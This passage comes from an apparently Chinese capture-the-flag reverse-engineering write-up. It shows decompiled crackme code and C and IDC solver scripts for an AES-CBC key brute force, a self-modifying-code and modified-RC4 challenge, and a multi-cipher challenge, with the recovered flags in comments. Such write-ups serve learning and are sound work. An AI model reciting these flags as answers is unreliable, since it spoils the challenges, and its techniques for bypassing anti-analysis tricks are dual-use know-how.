output_buff; long blocknum = InputLen / 16; long leftnum = InputLen % 16; int row; unsigned char temp[4]; unsigned char ex_key[16 * 15]; for (row = 0;row &lt; 4;row++) //拷贝seed 密钥 &#123; ex_key[4 * row + 0] = *(p_key + 4 * row); ex_key[4 * row + 1] = *(p_key + 4 * row + 1); ex_key[4 * row + 2] = *(p_key + 4 * row + 2); ex_key[4 * row + 3] = *(p_key + 4 * row + 3); &#125; for (row = 4;row &lt; 44;row++) &#123; temp[0] = ex_key[4 * row - 4]; //当前列的前一列 temp[1] = ex_key[4 * row - 3]; temp[2] = ex_key[4 * row - 2]; temp[3] = ex_key[4 * row - 1]; if (row % 4 == 0) &#123; unsigned char exchange_buff = 0; exchange_buff = temp[0]; temp[0] = AesSbox[16 * (temp[1] &gt;&gt; 4) + (temp[1] &amp; 0x0f)]; temp[1] = AesSbox[16 * (temp[2] &gt;&gt; 4) + (temp[2] &amp; 0x0f)]; temp[2] = AesSbox[16 * (temp[3] &gt;&gt; 4) + (temp[3] &amp; 0x0f)]; temp[3] = AesSbox[16 * (exchange_buff &gt;&gt; 4) + (exchange_buff &amp; 0x0f)]; temp[0] = temp[0] ^ AesRcon[4 * (row / 4) + 0]; temp[1] = temp[1] ^ AesRcon[4 * (row / 4) + 1]; temp[2] = temp[2] ^ AesRcon[4 * (row / 4) + 2]; temp[3] = temp[3] ^ AesRcon[4 * (row / 4) + 3]; &#125; ex_key[4 * row + 0] = ex_key[4 * (row - 4) + 0] ^ temp[0]; ex_key[4 * row + 1] = ex_key[4 * (row - 4) + 1] ^ temp[1]; ex_key[4 * row + 2] = ex_key[4 * (row - 4) + 2] ^ temp[2]; ex_key[4 * row + 3] = ex_key[4 * (row - 4) + 3] ^ temp[3]; &#125; for (i = 0;i &lt; blocknum;i++) &#123; for (j = 0; j &lt; 16; j++)lpCurOutBuff[j] = lpCurInBuff[j] ^ iv[j]; Cipher(lpCurOutBuff, lpCurOutBuff, ex_key); memcpy(iv, lpCurOutBuff, 16); lpCurInBuff += 16; lpCurOutBuff += 16; OutLength += 16; &#125; if (leftnum) &#123; unsigned char inbuff[16]; memset(inbuff, 16 - leftnum, 16); memcpy(inbuff, lpCurInBuff, leftnum); for (j = 0; j &lt; 16; j++)lpCurOutBuff[j] = inbuff[j] ^ iv[j]; Cipher(lpCurOutBuff, lpCurOutBuff, ex_key); memcpy(iv, lpCurOutBuff, 16); lpCurOutBuff += 16; OutLength += 16; &#125; else &#123; unsigned char extrabuff[16]; memset(extrabuff, 16, 16); for (j = 0; j &lt; 16; j++)lpCurOutBuff[j] = extrabuff[j] ^ iv[j]; Cipher(lpCurOutBuff, lpCurOutBuff, ex_key); memcpy(iv, lpCurOutBuff, 16); OutLength += 16; &#125; return OutLength;&#125;/********************************************************函数功能: AES解密, 模式CBC,数据块128位,填充方式:pkcs5padding* 参数:* input_buff:需要解密的数组指针* InputLen:需要解密数据的字节长度* p_key: 指向密钥数据的指针, 1~16字节长度* output_buff:加密结果输出指针** 返回值: OutLength 加密后的输出长度********************************************************/unsigned long AES128_CBC_Decrypt(unsigned char* input_buff, unsigned long InputLen, unsigned char* p_key, unsigned char* output_buff, unsigned char* iv)&#123; unsigned long OutLength = 0; long blocknum = InputLen / 16; long leftnum = InputLen % 16; long i, j; unsigned char temp[16]; unsigned char* pCurInBuf = input_buff; unsigned char* pCurOutBuf = output_buff; int row; unsigned char ex_key[16 * 15]; for (row = 0;row &lt; 4;row++) &#123; ex_key[4 * row + 0] = *(p_key + 4 * row); ex_key[4 * row + 1] = *(p_key + 4 * row + 1); ex_key[4 * row + 2] = *(p_key + 4 * row + 2); ex_key[4 * row + 3] = *(p_key + 4 * row + 3); &#125; for (row = 4;row &lt; 44;row++) &#123; temp[0] = ex_key[4 * row - 4]; //当前列的前一列 temp[1] = ex_key[4 * row - 3]; temp[2] = ex_key[4 * row - 2]; temp[3] = ex_key[4 * row - 1]; if (row % 4 == 0) &#123; unsigned char exchange_buff = 0; exchange_buff = temp[0]; temp[0] = AesSbox[16 * (temp[1] &gt;&gt; 4) + (temp[1] &amp; 0x0f)]; temp[1] = AesSbox[16 * (temp[2] &gt;&gt; 4) + (temp[2] &amp; 0x0f)]; temp[2] = AesSbox[16 * (temp[3] &gt;&gt; 4) + (temp[3] &amp; 0x0f)]; temp[3] = AesSbox[16 * (exchange_buff &gt;&gt; 4) + (exchange_buff &amp; 0x0f)]; temp[0] = temp[0] ^ AesRcon[4 * (row / 4) + 0]; temp[1] = temp[1] ^ AesRcon[4 * (row / 4) + 1]; temp[2] = temp[2] ^ AesRcon[4 * (row / 4) + 2]; temp[3] = temp[3] ^ AesRcon[4 * (row / 4) + 3]; &#125; ex_key[4 * row + 0] = ex_key[4 * (row - 4) + 0] ^ temp[0]; ex_key[4 * row + 1] = ex_key[4 * (row - 4) + 1] ^ temp[1]; ex_key[4 * row + 2] = ex_key[4 * (row - 4) + 2] ^ temp[2]; ex_key[4 * row + 3] = ex_key[4 * (row - 4) + 3] ^ temp[3]; &#125; for (i = 0;i &lt; blocknum;i++) &#123; InvCipher(pCurInBuf, pCurOutBuf, ex_key); for (j = 0; j &lt; 16; j++) &#123; pCurOutBuf[j] = pCurOutBuf[j] ^ iv[j]; &#125; memcpy(iv, pCurInBuf, 16); if (i == (blocknum - 1)) &#123; memset(temp, 0, 16); if (pCurOutBuf[15] != 0x10) &#123; if (pCurOutBuf[15] &lt; 0x10) &#123; OutLength = InputLen - pCurOutBuf[15]; memcpy(temp, pCurOutBuf, 16 - pCurOutBuf[15]); memcpy(pCurOutBuf, temp, 16); &#125; else break; &#125; else &#123; OutLength = InputLen - 16; memcpy(pCurOutBuf, temp, 16); &#125; &#125; pCurInBuf += 16; pCurOutBuf += 16; &#125; return OutLength;&#125;void md5(unsigned char* encrypt,unsigned char* decrypt)&#123; int i; MD5_CTX md5; MD5Init(&amp;md5); MD5Update(&amp;md5, encrypt, 0xc); MD5Final(&amp;md5, decrypt); //for (i = 0; i &lt; 16; i++) //&#123; // printf(&quot;%02x&quot;, decrypt[i]); //&#125; return 0;&#125;void initkey(unsigned char* a1, char day, char month)&#123; int year = 2024-1900; int j; // [esp+4h] [ebp-24h] int i; // [esp+8h] [ebp-20h] char Src[12] = &#123; 0 &#125;; // [esp+18h] [ebp-10h] BYREF char* src = Src; memset(Src, 0, sizeof(Src)); Src[0] = day; Src[4] = month - 1; Src[8] = year; //for (int i = 0; i &lt; 0xc; i++) //&#123; // printf(&quot;%02x &quot;, Src[i]); //&#125; //printf(&quot;\\n&quot;); md5(Src, a1); //for (int i = 0; i &lt; 16; i++) //&#123; // printf(&quot;%x &quot;, a1[i]); //&#125; //printf(&quot;\\n&quot;); for (i = 0; i &lt; 16; ++i) a1[i] ^= 0x14u; for (j = 0; j &lt; 16; ++j) a1[j] ^= 0x11u;&#125;void de1(char* flag) &#123; for (int i = 0; i &lt; 16; i++) &#123; flag[i] ^= 0x11; &#125;&#125;void de2(char* a1)&#123; unsigned int i; // [esp+0h] [ebp-8h] char v2; // [esp+7h] [ebp-1h] for (i = 0; i &lt; 0x10; i += 2) &#123; v2 = a1[i] ^ 5; a1[i] = a1[i + 1] ^ 5; a1[i + 1] = v2; &#125;&#125;void de3(char* a1)&#123; unsigned int i; // [esp+0h] [ebp-Ch] unsigned int v2; // [esp+4h] [ebp-8h] char v3; // [esp+Bh] [ebp-1h] v2 = 0; for (i = 15; v2 &lt; i; --i) &#123; v3 = a1[v2] ^ 0xF; a1[v2] = a1[i] ^ 0xF; a1[i] = v3; ++v2; &#125;&#125;void main(void)&#123; unsigned char key[16] = &#123; 0 &#125;; char day=6, month=3; for (month = 0; month &lt; 13; month++) &#123; for ( day = 0; day &lt; 31; day++) &#123; initkey(key, day, month); de2(key); //for (int i = 0; i &lt; 16; i++) //&#123; // printf(&quot;%x &quot;, key[i]); //&#125; unsigned char iv[32] = &#123; 0 &#125;; unsigned char flag[] = &#123; 0xCD, 0x16, 0xDB, 0xB5, 0xD1, 0x02, 0xA4, 0x82, 0x8E, 0x59, 0x73, 0x9E, 0x96, 0x26, 0x56, 0xF2, 0x16, 0x8E, 0x46, 0xF2, 0x55, 0x7B, 0x92, 0x31, 0x30, 0xDC, 0xAA, 0x8A, 0xF3, 0x1C, 0xA0, 0xAA &#125;; unsigned char okflag[33] = &#123; 0 &#125;; unsigned char* f = flag; unsigned char* ii = iv; unsigned char* ff = okflag; for (int i = 0; i &lt; 32; i+=16) &#123; //de1(f); de2(f); AES128_CBC_Decrypt(f, 16, key, ff, ii); de3(ff); f += 16; ii += 16; ff += 16; &#125; if(okflag[0]==&#x27;N&#x27;&amp;&amp;okflag[1]==&#x27;S&#x27;) &#123; printf(&quot;\\n%d %d:&quot;, month, day); for (int i = 0; i &lt; 32; i++) &#123; printf(&quot;%c&quot;, okflag[i]); &#125; //NSSCTF&#123;W0w_Y0u&#x27;re_@n_AE5_M@5t3r&#125; &#125; &#125; &#125; return;&#125; Room0异常+SMC+rc4变 123456789101112131415161718192021222324252627282930313233343536373839int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [esp+18h] [ebp-234h] char v5; // [esp+18h] [ebp-234h] char v6; // [esp+18h] [ebp-234h] char v7; // [esp+18h] [ebp-234h] char v8; // [esp+18h] [ebp-234h] int i; // [esp+2Ch] [ebp-220h] char v10[256]; // [esp+30h] [ebp-21Ch] BYREF char Str[256]; // [esp+130h] [ebp-11Ch] BYREF CPPEH_RECORD ms_exc; // [esp+234h] [ebp-18h] ms_exc.registration.TryLevel = 0; sub_4028C0(&quot;Welcome to the hostel!\\n&quot;, v4); sub_4028C0(&quot;Please input your informatioin to enter your room.\\n&quot;, v5); sub_4028C0(&quot;Input your flag:&quot;, v6); memset(Str, 0, sizeof(Str)); sub_402900(&quot;%s&quot;, (char)Str); sub_4028C0(&quot;Input your Key:&quot;, v7); memset(v10, 0, sizeof(v10)); sub_402900(&quot;%s&quot;, (char)v10); if ( sub_402000(v10) != 0x11451419 ) &#123; sub_4028C0(&quot;Not the key.\\n&quot;, v8); exit(0); &#125; sub_402130(Str, 0x19); for ( i = 0; i &lt; 32; ++i ) &#123; if ( Str[i] != (unsigned __int8)byte_405000[i] ) &#123; sub_4028C0(&quot;Your flag is incorrect.\\n&quot;, v8); exit(0); &#125; &#125; sub_4028C0(&quot;Welcome into your room\\n&quot;, v8); system(&quot;pause&quot;); return 0;&#125; 输入分两个一个key一个input，看汇编码会发现 这里是有异常处理的，并且还是有模有样地，不难猜测会有地方触发异常，肉眼可见的没有，就看看函数 123456789101112131415161718192021222324252627282930int __cdecl sub_402000(char *Str)&#123; int v2; // [esp+0h] [ebp-1Ch] int i; // [esp+4h] [ebp-18h] int v4; // [esp+8h] [ebp-14h] int v5; // [esp+Ch] [ebp-10h] int v6; // [esp+10h] [ebp-Ch] int v7; // [esp+10h] [ebp-Ch] unsigned int v8; // [esp+14h] [ebp-8h] int v9; // [esp+18h] [ebp-4h] v2 = sub_402590(Str); if ( !v2 ) return 0; v6 = 0; v9 = v2; v8 = HIBYTE(v2); v5 = BYTE2(v2); v4 = BYTE1(v2); for ( i = 0; i &lt; 32; ++i ) &#123; v7 = v6 * (v8 + 1415881080) * (v9 - 1467486175) * ((v8 - v9) ^ (v8 &gt;&gt; 4)); v5 = (v9 + v5) ^ (8 * v4); v4 = (v9 + v8) ^ (8 * v5); v8 = (v9 + v4) ^ (8 * v5); v9 -= v4 + v5 + v8; v6 = v7 + (v8 + 1467486175) * (((v8 - v9) ^ (unsigned __int64)(v8 &gt;&gt; 4)) / (unsigned int)(v9 - 1415881080)); &#125; return v9 ^ v6;&#125; &#x2F;-div，能够引发除零异常，所以这里必然会引起异常到异常处理模块，这么一看题目名字room 0 原来意思是异常提示，真是旁观者清啊 那么看异常怎么做了 1234567891011121314mov esp, [ebp+ms_exc.old_esp]mov ebx, [esp+224h+var_23C]mov eax, ebpsub eax, 21Chpush eax ; Strcall sub_402590push eaxcall loc_402410mov eax, ebpsub eax, 11Chpush ebxpush eaxcall sub_401000mov [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh 三个函数，第一个之前在验证函数就出现了，是ascii码转16进制，比如你输入的是1a，就会变成0x1a，类似于python代码的int(‘1a’,16)实现了 第二个函数有花指令去一下 这里是永真不爆红花，需要把retn去掉 后面是永真跳转 12345678910111213141516171819202122232425262728293031323334353637383940int __stdcall sub_402410(unsigned int a1)&#123; int result; // eax int v2; // [esp+10h] [ebp-30h] char *v3; // [esp+18h] [ebp-28h] int j; // [esp+20h] [ebp-20h] __int16 v5; // [esp+24h] [ebp-1Ch] HMODULE ModuleHandleW; // [esp+28h] [ebp-18h] char *Str1; // [esp+2Ch] [ebp-14h] int i; // [esp+30h] [ebp-10h] int k; // [esp+34h] [ebp-Ch] int v10; // [esp+38h] [ebp-8h] ModuleHandleW = GetModuleHandleW(0); v10 = 0; for ( i = 0; i &lt; 4; ++i ) *((_BYTE *)&amp;v10 + i) = a1 &gt;&gt; (8 * (3 - i)); v5 = *(_WORD *)((char *)ModuleHandleW + *((_DWORD *)ModuleHandleW + 15) + 6); result = (int)ModuleHandleW + *((_DWORD *)ModuleHandleW + 15) + 248; Str1 = (char *)result; for ( j = 0; j &lt; v5; ++j ) &#123; if ( !strcmp(Str1, &quot;.enc&quot;) ) &#123; v2 = *((_DWORD *)Str1 + 4); v3 = (char *)ModuleHandleW + *((_DWORD *)Str1 + 3); for ( k = 0; ; ++k ) &#123; result = k; if ( k &gt;= v2 ) break; v3[k] ^= *((_BYTE *)&amp;v10 + k % 4); &#125; return result; &#125; result = (int)(Str1 + 40); Str1 += 40; &#125; return result;&#125; 检测当前块是不是enc，如果是的话就进行SMC，解密而SMC异或的对象就是前面输入的key，那么问题来了，key应该是多少呢，这里我动调发现SMC解密的对象就是下一个要调用的函数，再因为一般函数的开头都是55 8B EC 第四个有多种可能，我后来尝试发现对应异或应该是d3，并且 我们能发现，这个函数后续都是75 5f f0 d3并且我计算出key的前几位也是75 5f f0，这也验证了第四位是d3的思路，这样这里SMC解密后就是0了，所以key就是755ff0d3 idc脚本： 12345start=0x00401000key=[0x75, 0x5F, 0xF0, 0xD3]end=0x00401600for i in range(end-start): patch_byte(start+i,get_wide_byte(start+i)^key[i%4]) 这里如果是动调看的话有两种花各两个，一种是爆红的永真跳，另一种是不爆红的花，但是如果是脚本静态的看好像就不报错 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071int __cdecl sub_401000(char *Str, unsigned int a2)&#123; unsigned __int8 v2; // al char v4; // [esp-10h] [ebp-244h] size_t v5; // [esp+0h] [ebp-234h] char v6; // [esp+4h] [ebp-230h] int v7; // [esp+8h] [ebp-22Ch] int ii; // [esp+Ch] [ebp-228h] size_t n; // [esp+10h] [ebp-224h] int k; // [esp+14h] [ebp-220h] int j; // [esp+18h] [ebp-21Ch] int m; // [esp+1Ch] [ebp-218h] int i; // [esp+20h] [ebp-214h] char v14; // [esp+24h] [ebp-210h] char v15; // [esp+25h] [ebp-20Fh] unsigned __int8 v16; // [esp+26h] [ebp-20Eh] unsigned __int8 v17; // [esp+27h] [ebp-20Dh] char v18[256]; // [esp+28h] [ebp-20Ch] BYREF char v19[256]; // [esp+128h] [ebp-10Ch] BYREF int v20[2]; // [esp+228h] [ebp-Ch] v20[0] = 0; v20[1] = 0; v2 = (unsigned __int8)memset(v19, 0, sizeof(v19)); for ( i = 0; i &lt; 8; ++i ) &#123; if ( i &gt;= 4 ) v6 = 7 - i; else v6 = i; v2 = i; *((_BYTE *)v20 + i) = a2 &gt;&gt; (8 * v6); &#125; for ( j = 0; j &lt; 256; ++j ) &#123; v2 = j; v19[j] = j; &#125; v4 = v2; memset(v18, 0, sizeof(v18)); for ( k = 0; k &lt; 256; ++k ) v18[k] = *((_BYTE *)v20 + k % 8); v7 = 0; for ( m = 0; m &lt; 256; ++m ) &#123; v7 = ((unsigned __int8)v18[m] + v7 + (unsigned __int8)v19[m]) % 256; v15 = v19[m]; v19[m] = v19[v7]; v19[v7] = v15; &#125; v17 = 0; v16 = 0; v5 = strlen(Str); for ( n = 0; n &lt; v5; ++n ) &#123; v16 += v19[++v17]; v14 = v19[v17]; v19[v17] = v19[v16]; v19[v16] = v14; Str[n] ^= *((_BYTE *)v20 + (v17 &amp; 7)) ^ v19[((unsigned __int8)v19[v16] + (unsigned __int8)v19[v17]) % 256]; &#125; for ( ii = 0; ii &lt; 32; ++ii ) &#123; if ( byte_405020[ii] != Str[ii] ) &#123; sub_4028C0(&quot;You shouldn&#x27;t come here, get out of that room!\\n&quot;, v4); exit(0); &#125; &#125; return 1;&#125; 可以看出来时rc4，但是再rc4最后一步异或的时候多异或了一个key，逻辑就是把a2 01233210的方式加倍生成8位key，然后rc4，所以现在只需要知道key就可以解密了，动调看把 后面我测试了一下，如果除零异常时手动将div ecx里面的ecx改成了0，则最终ebx，也就是a2传参就是0，但如果是正常的输入正确key然后运行过程中爆除零异常，那么ebx就会是正确的key 可以看到如果是正常输入的话，i&#x3D;&#x3D;0xf的时候会变成0，这时候 ebx会是正确key，大概能猜到，这里的ebx就是之前那些计算留下来的数 解题脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include&lt;time.h&gt;unsigned char keybox[256] = &#123; 0 &#125;;//标准RC4unsigned char keyk[8] = &#123; 0 &#125;;void rc4(unsigned char* key, int key_Len, unsigned char* data, int data_Len) //加解密&#123; int i = 0, j = 0, t = 0; unsigned char s[256] = &#123; 0 &#125;; unsigned char* ps = s; unsigned char tmp = 0; for (i = 0;i &lt; 256;i++) &#123; s[i] = i; &#125; for (i = 0; i &lt; 256; i++) &#123; j = (j + s[i] + keybox[i]) % 256; tmp = s[i]; s[i] = s[j]; //交换s[i]和s[j] s[j] = tmp; &#125; int q = 0; i = j = 0; for (q = 0;q &lt; data_Len;q++) &#123; i = (i + 1) % 256; j = (j + s[i]) % 256; tmp = s[i]; s[i] = s[j]; //交换s[x]和s[y] s[j] = tmp; t = (s[i] + s[j]) % 256; data[q] ^= s[t]^ keyk[i % 8]; &#125;&#125;int main() &#123; int i; unsigned char flag[] = &#123; 0x22, 0xC4, 0xA0, 0x5A, 0xDE, 0xED, 0x62, 0x5E, 0x25, 0xE2, 0x6D, 0xA6, 0x05, 0xA7, 0x20, 0x8D, 0x7D, 0x99, 0x52, 0x3E, 0x8C, 0xA7, 0x7F, 0xFA, 0x09, 0xD8, 0x62, 0xDB, 0x00, 0x80, 0xC2, 0xA9 &#125;; //10E70D20C9D7B5FF171710364C502E6A0EFF70CEF380835E605587810080C2A9A9 unsigned int key = 0xF86D35D4; //755FF0D3 char v6; for (i = 0; i &lt; 8; ++i) &#123; if (i &gt;= 4) v6 = 7 - i; else v6 = i; keyk[i] = key &gt;&gt; (8 * v6); &#125; //for (i = 0; i &lt; 8; i++) //&#123; // printf(&quot;%x &quot;, keyk[i]); //&#125; //printf(&quot;\\n&quot;); for (i = 0; i &lt; 256; i++) &#123; keybox[i] = keyk[i % 8]; &#125; rc4(keyk, 8, flag, 32); for ( i = 0; i &lt; 32; i++) &#123; printf(&quot;%c&quot;, flag[i]); &#125; //NSSCTF&#123;Int3r3st1ng_5MC_Pr0gr@m?&#125; return 0;&#125; canno就是考加解密的，拖进ida 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int64 v3; // rdx __int64 v4; // r8 __int64 v6; // rdx __int64 v7; // r8 int j; // [rsp+20h] [rbp-1F8h] int i; // [rsp+24h] [rbp-1F4h] int v10; // [rsp+28h] [rbp-1F0h] int v11[4]; // [rsp+30h] [rbp-1E8h] __int64 v12; // [rsp+40h] [rbp-1D8h] __int64 v13; // [rsp+48h] [rbp-1D0h] __int64 v14; // [rsp+50h] [rbp-1C8h] int v15[8]; // [rsp+58h] [rbp-1C0h] int v16[4]; // [rsp+78h] [rbp-1A0h] char input1[12]; // [rsp+88h] [rbp-190h] BYREF char input2[12]; // [rsp+94h] [rbp-184h] BYREF char input3[16]; // [rsp+A0h] [rbp-178h] BYREF char i1[112]; // [rsp+B0h] [rbp-168h] BYREF char i2[112]; // [rsp+120h] [rbp-F8h] BYREF char i3[112]; // [rsp+190h] [rbp-88h] BYREF sub_7FF68C1A2470(&quot;Enter the flag: &quot;, argv, envp); sub_7FF68C1A24F0(&quot;%36s&quot;, input1); // aaaaaaaaaaaabbbbbbbbbbbbcccccccccccc if ( strlen(input1) == 0x24 ) &#123; strncpy(i1, input1, 0xCui64); v12 = 12i64; i1[12] = 0; strncpy(i2, input2, 0xCui64); v13 = 12i64; i2[12] = 0; strncpy(i3, input3, 0xCui64); v14 = 12i64; i3[12] = 0; // 分三份 v15[0] = 1; v15[1] = 5; v15[2] = 6; v15[3] = 3; v15[4] = 4; v15[5] = 1; v15[6] = 4; v15[7] = 5; v16[0] = 0; v16[1] = 1; v16[2] = 2; v11[0] = 0; v11[1] = 0; v11[2] = 0; for ( i = 0; i &lt; 8; ++i ) &#123; for ( j = 0; j &lt; 3; ++j ) &#123; if ( i &gt;= v16[j] ) &#123; v10 = v11[j]; if ( v10 &lt; 8 ) &#123; if ( j ) &#123; if ( j == 1 ) &#123; crypt(i2, i3, v15[v10]); &#125; else if ( j == 2 ) &#123; crypt(i3, i1, v15[v10]); &#125; &#125; else &#123; crypt(i1, i2, v15[v10]); &#125; ++v11[j]; &#125; &#125; &#125; &#125; if ( !strcmp(i1, &quot;WgvDmssEvcY326bHo3nNro3vXvvfmgrz&quot;) &amp;&amp; !strcmp(i2, &quot;gX+Ri9PG=bt5=00B6hscPQOL&quot;) &amp;&amp; !strcmp(i3, &quot;T6bHgUPL2gXUd=xT=FNHtPzV&quot;) ) &#123; sub_7FF68C1A2470(&quot;Congratulations! You have found the flag!\\n&quot;, v6, v7); &#125; else &#123; sub_7FF68C1A2470(&quot;Invalid flag!\\n&quot;, v6, v7); &#125; return 0; &#125; else &#123; sub_7FF68C1A2470(&quot;Invalid flag!\\n&quot;, v3, v4); return 0; &#125;&#125; 把输入拆成三部分(i1,i2,i3)，然后根据 j 012决定谁做key谁做密文，看加密函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157void __fastcall crypt(char *a1, const char *a2, int a3)&#123; size_t v3; // rax signed int v4; // eax size_t v5; // rax signed int v6; // eax signed int i; // [rsp+20h] [rbp-F8h] signed int j; // [rsp+24h] [rbp-F4h] signed int lena1; // [rsp+28h] [rbp-F0h] int num6; // [rsp+2Ch] [rbp-ECh] char v11; // [rsp+30h] [rbp-E8h] int m; // [rsp+34h] [rbp-E4h] int n; // [rsp+38h] [rbp-E0h] signed int i1; // [rsp+3Ch] [rbp-DCh] int k; // [rsp+40h] [rbp-D8h] int ii; // [rsp+44h] [rbp-D4h] int jj; // [rsp+48h] [rbp-D0h] signed int v18; // [rsp+4Ch] [rbp-CCh] int nn; // [rsp+50h] [rbp-C8h] int kk; // [rsp+54h] [rbp-C4h] int lena2; // [rsp+58h] [rbp-C0h] int v22; // [rsp+5Ch] [rbp-BCh] int mm; // [rsp+60h] [rbp-B8h] char **Block; // [rsp+68h] [rbp-B0h] int v25; // [rsp+7Ch] [rbp-9Ch] int *a1_1; // [rsp+88h] [rbp-90h] int *out2; // [rsp+90h] [rbp-88h] int *out; // [rsp+98h] [rbp-80h] char *Source; // [rsp+A0h] [rbp-78h] char *v30; // [rsp+A8h] [rbp-70h] char *v31; // [rsp+B0h] [rbp-68h] int num[12]; // [rsp+B8h] [rbp-60h] __int64 v33; // [rsp+E8h] [rbp-30h] __int64 v34; // [rsp+F0h] [rbp-28h] lena1 = strlen(a1); lena2 = strlen(a2); switch ( a3 ) &#123; case 1: for ( i = 0; i &lt; lena1; ++i ) &#123; v22 = a2[i % lena2]; if ( a1[i] &lt; 65 || a1[i] &gt; 90 ) &#123; if ( a1[i] &lt; 97 || a1[i] &gt; 122 ) &#123; if ( a1[i] &gt;= 48 &amp;&amp; a1[i] &lt;= 57 ) a1[i] = (a1[i] + v22 - 48) % 10 + 48; &#125; else &#123; a1[i] = (a1[i] + v22 - 97) % 26 + 97; &#125; &#125; else &#123; a1[i] = (a1[i] + v22 - 65) % 26 + 65; &#125; &#125; break; case 2: num[0] = 1; num[1] = 3; num[2] = 5; num[3] = 7; num[4] = 9; num[5] = 11; num[6] = 15; num[7] = 17; num[8] = 19; num[9] = 21; num[10] = 23; num[11] = 25; for ( j = 0; j &lt; lena1; ++j ) &#123; if ( a1[j] &lt; 65 || a1[j] &gt; 90 ) &#123; if ( a1[j] &gt;= 97 &amp;&amp; a1[j] &lt;= 122 ) a1[j] = (a2[j % lena2] + num[j % 12] * (a1[j] - 97)) % 26 + 97; &#125; else &#123; a1[j] = (a2[j % lena2] + num[j % 12] * (a1[j] - 65)) % 26 + 65; &#125; &#125; break; case 3: num6 = *a2 % 10 + 2; v33 = num6; Block = malloc(saturated_mul(num6, 8ui64)); for ( k = 0; k &lt; num6; ++k ) &#123; Block[k] = malloc(lena1 + 1); memset(Block[k], 0, lena1 + 1); &#125; for ( m = 0; num6 * m &lt; lena1; ++m ) &#123; for ( n = 0; n &lt; num6 &amp;&amp; n + num6 * m &lt; lena1; ++n ) Block[n][m] = a1[n + num6 * m]; &#125; v18 = 0; for ( ii = 0; ii &lt; num6; ++ii ) &#123; for ( jj = 0; jj &lt; m; ++jj ) &#123; if ( Block[ii][jj] &amp;&amp; v18 &lt; lena1 ) a1[v18++] = Block[ii][jj]; &#125; &#125; a1[v18] = 0; for ( kk = 0; kk &lt; num6; ++kk ) free(Block[kk]); free(Block); break; case 4: v25 = *a2 % 10 + 2; for ( mm = 0; mm &lt; v25; ++mm ) &#123; v11 = a1[lena1 - 1]; for ( nn = lena1 - 1; nn &gt; 0; --nn ) a1[nn] = a1[nn - 1]; *a1 = v11; &#125; break; case 5: v34 = lena1; a1_1 = malloc(saturated_mul(lena1, 4ui64)); for ( i1 = 0; i1 &lt; lena1; ++i1 ) a1_1[i1] = (a2[i1 % lena2] + 57) ^ a1[i1]; Source = base64(a1_1, lena1); strcpy(a1, Source); free(a1_1); free(Source); break; case 6: v3 = saturated_mul(strlen(a1), 4ui64); out2 = malloc(v3); rc4(a1, a2, out2); v4 = strlen(a1); v30 = base64(out2, v4); strcpy(a1, v30); free(out2); free(v30); break; case 7: v5 = saturated_mul(strlen(a1), 4ui64); out = malloc(v5); rc4_0(a1, a2, out); v6 = strlen(a1); v31 = base64(out, v6); strcpy(a1, v31); free(out); free(v31); break; &#125;&#125; 可以看到根据前文的v15来决定这里是哪种加密，一共7种case，所以先模拟出每一种的j对应的case，然后写每一种的解密 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include&lt;time.h&gt;#include&lt;stdint.h&gt;unsigned char* base64_encode(const char* str0)&#123; unsigned char* str = (unsigned char*)str0; //转为unsigned char无符号,移位操作时可以防止错误 unsigned char base64_map[] = &quot;stuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr&quot;;//数组形式,方便修改 long len; //base64处理后的字符串长度 long str_len; //源字符串长度 long flag; //用于标识模3后的余数 unsigned char* res; //返回的字符串 str_len = strlen((const char*)str); switch (str_len % 3) //判断模3的余数 &#123; case 0:flag = 0; len = str_len / 3 * 4; break; case 1:flag = 1; len = (str_len / 3 + 1) * 4; break; case 2:flag = 2; len = (str_len / 3 + 1) * 4; break; &#125; res = (unsigned char*)malloc(sizeof(unsigned char) * len + 1); for (int i = 0, j = 0; j &lt; str_len - flag; j += 3, i += 4)//先处理整除部分 &#123; //注意&amp;运算和位移运算的优先级,是先位移后与或非 res[i] = base64_map[str[j] &gt;&gt; 2]; res[i + 1] = base64_map[(str[j] &amp; 0x3) &lt;&lt; 4 | str[j + 1] &gt;&gt; 4]; res[i + 2] = base64_map[(str[j + 1] &amp; 0xf) &lt;&lt; 2 | (str[j + 2] &gt;&gt; 6)]; res[i + 3] = base64_map[str[j + 2] &amp; 0x3f]; &#125; //不满足被三整除时,要矫正 switch (flag) &#123; case 0:break; //满足时直接退出 case 1:res[len - 4] = base64_map[str[str_len - 1] &gt;&gt; 2]; //只剩一个字符时,右移两位得到高六位 res[len - 3] = base64_map[(str[str_len - 1] &amp; 0x3) &lt;&lt; 